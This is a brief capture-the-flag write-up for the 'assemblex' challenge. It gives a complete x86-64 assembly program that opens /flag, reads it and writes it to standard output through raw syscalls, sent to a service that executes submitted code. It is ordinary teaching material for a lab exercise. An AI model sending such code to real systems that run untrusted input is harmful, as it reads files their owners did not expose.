# assemblex Write-up

This challenge simply executes the assembly code that is sent to the service.
The user has to create a simple assembly program that opens the flag file, reads the file's content, and writes the contents to standard output.

mov rdi, flag_str
    mov rax, 2              ; syscall: open
    xor rsi, rsi
    xor rdx, rdx
    syscall
    mov rdi, rax            ; fd
    mov rsi, flag_buf
    mov rdx, 100
    mov rax, 0              ; syscall: read
    syscall
    mov rdi, 1              ; stdout
    mov rsi, flag_buf
    mov rdx, 100
    mov rax, 1              ; syscall: write
    syscall
    mov rax, 60             ; syscall: exit
    xor rdi, rdi
    syscall
section .data
    flag_str db "/flag", 0
    flag_buf times 100 db 0
